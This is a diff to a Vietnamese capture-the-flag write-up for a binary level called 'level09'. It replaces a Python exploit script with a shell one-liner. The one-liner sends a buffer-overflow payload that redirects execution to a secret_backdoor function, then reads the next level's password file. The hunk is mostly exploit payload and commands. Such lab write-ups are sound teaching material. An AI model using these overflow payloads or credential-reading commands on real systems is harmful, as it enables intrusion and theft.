@@ -203,22 +203,14 @@ Phần 3 - LỆNH (sau khi nhảy vào secret_backdoor):
 ## Bước 7: Chạy exploit
 
 ```bash
-python -c "
-import struct, sys
+# Bước 1: payload overflow + giữ stdin mở
+(python -c "print 'A'*40 + '\xff' + '\n' + 'A'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'"; cat) | ./level09
 
-backdoor = 0x55555555488c
-
-username = 'A'*40 + '\xff'
-msg = 'B'*200 + struct.pack('<Q', backdoor)
-cmd = 'cat /home/users/end/.pass\n'
-
-sys.stdout.write(username + '\n' + msg + '\n' + cmd)
-" | ./level09
+# Bước 2: sau khi secret_backdoor() gọi fgets(), gõ lệnh muốn chạy:
+cat /home/users/end/.pass | cat
 ```
 
-**Giải thích `struct.pack('<Q', backdoor)`:**
 - `<` = little-endian (x86 lưu bytes từ thấp đến cao)
-- `Q` = unsigned 64-bit integer (8 bytes)
 - Biến `0x55555555488c` thành `\x8c\x48\x55\x55\x55\x55\x00\x00`
 
 ---
